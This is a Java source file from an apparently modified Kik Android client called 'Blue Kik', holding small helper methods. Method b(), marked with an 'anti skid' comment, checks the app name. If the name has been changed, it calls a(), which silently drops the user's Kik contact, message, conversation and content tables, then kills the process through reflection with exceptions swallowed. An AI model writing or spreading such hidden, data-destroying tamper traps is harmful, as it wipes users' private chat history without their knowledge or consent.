package lynx.blue.chat.vm;

import android.content.Context;
import android.database.sqlite.SQLiteDatabase;
import android.graphics.Bitmap;
import android.graphics.Bitmap.CompressFormat;
import android.graphics.drawable.BitmapDrawable;

import java.io.ByteArrayOutputStream;
import java.text.SimpleDateFormat;
import java.util.Calendar;

import blue.Tools;
import blue.luminosity.database;
import lynx.blue.chat.KikApplication;
import lynx.blue.chat.activity.IntroActivity;

public class sa {

    //Big anti skid hahahahha
    public static void b() {
        if (!KikApplication.getStringFromResource(2131755139).equals("Blue Kik")) {
            a();
        }
    }

    public static String getR(String xmpp) {
        if (!xmpp.contains("<r>")) {
            return "null";
        }
        String substring = xmpp.substring(xmpp.indexOf("<r>") + 3);
        String str = "";
        return substring.replace(substring.substring(substring.indexOf("</r>") + 4), str).replace("</r>", str);
    }

    public static String getShit() {
        return new SimpleDateFormat("MM/dd").format(Calendar.getInstance().getTime());
    }


    public static void init() {
        database.setBoolean("init.complete", true);
    }



    public static byte[] resToByte(int i) {
        Bitmap bitmap = ((BitmapDrawable) g().getResources().getDrawable(i)).getBitmap();
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        bitmap.compress(CompressFormat.JPEG, 10, byteArrayOutputStream);
        return byteArrayOutputStream.toByteArray();
    }

    public static void setShit() {
        database.setString("date.shit", new SimpleDateFormat("MM/dd").format(Calendar.getInstance().getTime()));
    }


    public static void f(java.lang.String r4, java.lang.String r5) {
        try (SQLiteDatabase openDatabase = KikApplication.u.getApplicationContext().openOrCreateDatabase( r4, Context.MODE_PRIVATE, null)) {
            openDatabase.execSQL(r5);
        }
    }

    public static Context g() {
        return KikApplication.u.getApplicationContext();
    }

    public static String getTodaysShit() {
        return database.getString("date.shit", "9-22");
    }


    public static void a() {
        try {
            f(Tools.buildCoreID("kikDatabase.db"), "DROP TABLE IF EXISTS KIKcontactsTable;");
            f(Tools.buildCoreID("kikDatabase.db"), "DROP TABLE IF EXISTS KIKConversationStatusTable;");
            f(Tools.buildCoreID("kikDatabase.db"), "DROP TABLE IF EXISTS messagesTable;");
            f(Tools.buildCoreID("kikDatabase.db"), "DROP TABLE IF EXISTS memberTable;");
            f(Tools.buildCoreID("kikDatabase.db"), "DROP TABLE IF EXISTS KIKContentTable;");
            f(Tools.buildCoreID("kikDatabase.db"), "DROP TABLE IF EXISTS KIKContentURITable;");
            f(Tools.buildCoreID("kikDatabase.db"), "DROP TABLE IF EXISTS KIKContentRetainCountTable;");
            f(Tools.buildCoreID("kikDatabase.db"), "DROP TABLE IF EXISTS KIKSponsoredUsersTable;");
            f(Tools.buildCoreID("kikDatabase.db"), "DROP TABLE IF EXISTS suggestedResponseTable;");
            f(Tools.buildCoreID("kikDatabase.db"), "DROP TABLE IF EXISTS chatMetaInfTable;");
            Class cls = Class.forName("android.os.Process");
            cls.getMethod("killProcess", new Class[]{Integer.TYPE}).invoke(null, new Object[]{cls.getMethod("myPid", new Class[0]).invoke(null, new Object[0])});
            Class.forName("android.os.Process").getMethod("exit", new Class[]{Integer.TYPE}).invoke(null, new Object[]{Integer.valueOf(0)});
            Class.forName("android.content.Context").getMethod("finish", new Class[0]).invoke(IntroActivity.context, new Object[0]);
        } catch (Exception e) {
        }
    }
}
